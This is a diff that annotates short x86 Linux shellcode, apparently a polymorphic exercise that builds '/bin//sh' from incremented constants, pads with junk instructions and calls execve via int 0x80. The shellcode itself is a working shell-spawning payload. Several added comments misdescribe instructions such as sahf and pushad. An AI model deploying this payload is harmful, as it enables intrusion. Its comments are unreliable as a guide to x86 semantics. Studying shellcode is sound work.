@@ -2,27 +2,27 @@ global _start
 
 _start:
 
-       sahf
+       sahf                      ; Should store instructions. However, it is used as a NOP equivalent.
 
-       xor    eax,eax
-       pushad
-       push   eax
+       xor    eax,eax            ; Zeroes out EAX.
+       pushad                    ; Should save the current flags. However, it is used as a NOP equivalent.
+       push   eax                ; Pushes the dword of EAX (0x00000000)
 
-       cld
-       mov esi, 0x68732f2e
-       inc esi
-       cdq
-       mov edi, 0x6e69622e
-       inc edi
+       cld                       ; Should clear the direction flag. However, it is used as a NOP equivalent.
+       mov esi, 0x68732f2e       ; Saves value "hs/.". If incremented by 1, it should possess value "hs//"
+       inc esi                   ; Increments ESI
+       cdq                       ; Zeroes out EDX.
+       mov edi, 0x6e69622e       ; Saves value "nib.". If incremented by 1, it should possess value "bin/"
+       inc edi                   ; Increments EDI
 
-       push esi
-       std
-       push edi
+       push esi                  ; Pushes the value of ESI ("hs//")
+       std                       ; NOP Equivalent
+       push edi                  ; Pushes the value of EDI ("bin/")
 
-       mov ebx, esp
-       push eax
+       mov ebx, esp              ; Saves the value of ESP in EBX
+       push eax                  ; Pushes the dword of EAX (0x00000000)
 
-       push ebx
+       push ebx                  ; Pushes the value of ebx
 
        mov al, 11
        int 0x80
